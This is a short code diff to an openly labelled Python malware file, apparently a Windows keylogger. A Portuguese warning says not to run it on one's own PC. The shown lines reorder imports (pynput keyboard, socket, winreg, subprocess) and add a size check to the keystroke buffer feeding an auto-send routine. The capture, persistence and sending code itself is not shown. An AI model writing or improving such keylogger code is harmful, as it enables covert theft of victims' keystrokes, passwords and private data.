@@ -1,15 +1,13 @@
+from datetime import datetime
+from pynput import keyboard
+from time import time
 
-import os
-import sys
+import subprocess
 import shutil
 import socket
 import winreg
-import subprocess
-
-from time import time
-from pynput import keyboard
-from datetime import datetime
-
+import os
+import sys
 
 #WARNING : NUNCA EXECUTE ESSE MALWARE NO SEU PROPRIO PC , SE FOR TESTAR , TESTE EM MAQUINAS VIRTUAIS 
 
@@ -43,7 +41,7 @@ def on_press(key):
     global keylog_buffer, buffer_auto_send_pending
     
     formatted  = format_key(key)
-    if formatted:
+    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
         keylog_buffer.append(formatted)
     
     if len(keylog_buffer) >= MAX_BUFFER_SIZE:
